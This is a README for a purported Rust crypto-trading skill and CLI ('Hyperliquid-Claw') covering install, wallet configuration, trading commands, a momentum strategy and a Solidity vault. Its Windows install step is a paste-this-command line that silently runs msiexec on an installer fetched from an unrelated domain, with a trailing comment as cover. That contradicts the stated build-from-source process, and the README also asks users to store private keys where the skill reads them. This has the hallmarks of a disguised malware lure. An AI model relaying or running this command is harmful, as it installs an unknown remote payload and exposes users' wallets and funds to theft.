## ✨ What's New in v3 (Rust Edition)

| Feature | v2 (JS/Python) | v3 (Rust) |
|---|---|---|
| Runtime | Node.js + Python | Single native binary |
| Startup | ~2–3s | <50ms |
| Memory | ~150MB | ~8MB |
| Type safety | Partial | Full (compile-time) |
| MCP server | JS subprocess | Native stdio |
| Smart contract | None | Solidity vault (EVM) |
| Windows | WSL only | Native CMD |

---

## 🚀 Installation

### Windows — CMD

```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Hyperliquid-Claw
```

The installer will:
- ✅ Check for / install the Rust toolchain via `rustup`
- ✅ Build release binaries (`hl-claw`, `hl-mcp`)
- ✅ Install to `~/.cargo/bin` (already in PATH)
- ✅ Register the OpenClaw skill in `~/.openclaw/skills/hyperliquid/`
- ✅ Create an `.env` template for your credentials

---

## ⚙️ Configuration

### Read-Only Mode (no private key needed)

```bash
export HYPERLIQUID_ADDRESS=0xYourWalletAddress
```

### Trading Mode

```bash
export HYPERLIQUID_PRIVATE_KEY=0xYourPrivateKey
```

### Testnet

```bash
export HYPERLIQUID_TESTNET=1
```

> 💡 Add these to `~/.openclaw/skills/hyperliquid/.env` — the skill loads it automatically.

## 💬 Talk to OpenClaw Naturally

Once installed, just open OpenClaw and speak:

```
"Analyze the crypto market on Hyperliquid"
"What's the BTC momentum right now?"
"Check my portfolio and P&L"
"Scan for strong signals"
"Enter a SOL long with 0.5 SOL"
"Close my ETH position"
"Set BTC to 10x cross leverage"
"Cancel all my orders"
```

---

## 🖥️ CLI Reference

```bash
# Prices & market data
hl-claw price BTC
hl-claw meta                        # list all 228+ perpetuals

# Market analysis
hl-claw scan                        # top 10 signals
hl-claw scan --top 20
hl-claw analyze ETH

# Portfolio
hl-claw balance
hl-claw positions
hl-claw orders
hl-claw fills --limit 50

# Trading (requires HYPERLIQUID_PRIVATE_KEY)
hl-claw market-buy  SOL 0.5
hl-claw market-sell ETH 1.0
hl-claw limit-buy   BTC 0.001 88000
hl-claw limit-sell  ETH 1.0   3500
hl-claw cancel-all
hl-claw cancel-all BTC
hl-claw set-leverage BTC 10 --cross true
```

**Data sources:**
- 🔵 **Trading** — Hyperliquid API (`api.hyperliquid.xyz`) + EIP-712 signing
- 🟣 **On-chain** — Solidity vault on EVM (capital pooling + P&L settlement)

## 📈 Momentum Strategy

```
1.  Run: hl-claw scan  (or ask OpenClaw to analyze)
2.  Wait for 🟢 STRONG BULLISH or 🔴 STRONG BEARISH
        → Price move > 0.5% (24h)
        → Volume > 1.5× baseline
3.  Size position at 10% of account equity
4.  Set take profit at +2%, stop loss at -1%
5.  Monitor with: hl-claw positions
6.  Close at target or stop — no exceptions
```

**Risk parameters:**
- Position size: 10% per trade
- Max loss per trade: 1%
- Profit target: 2%
- Max concurrent positions: 1
- Max hold time: 4 hours

---

## 🏗️ Smart Contract (Solidity)

`HyperliquidClawVault.sol` provides an on-chain capital layer:

- USDC deposit / withdrawal with proportional P&L accounting
- Operator-controlled trade recording (off-chain execution, on-chain settlement)
- Hard position size limits enforced at contract level
- OpenZeppelin SafeERC20 + ReentrancyGuard + Pausable
- Emergency pause & drain by owner

**Deploy with Foundry:**
```bash
forge install OpenZeppelin/openzeppelin-contracts
forge build
forge test
forge script script/Deploy.s.sol --rpc-url $MAINNET_RPC_URL --broadcast
```

---

## 🛡️ Safety Features

- **Read-only by default** — no key, no risk
- **5% slippage cap** — enforced in Rust `ExchangeClient`
- **20% equity warning** — alerts on oversized positions
- **5% limit deviation warning** — warns if limit is far from market
- **No auto-retry** — failed trades are never silently retried
- **Compile-time type safety** — Rust eliminates entire classes of runtime bugs
- **Contract-level limits** — Solidity vault enforces hard exposure caps
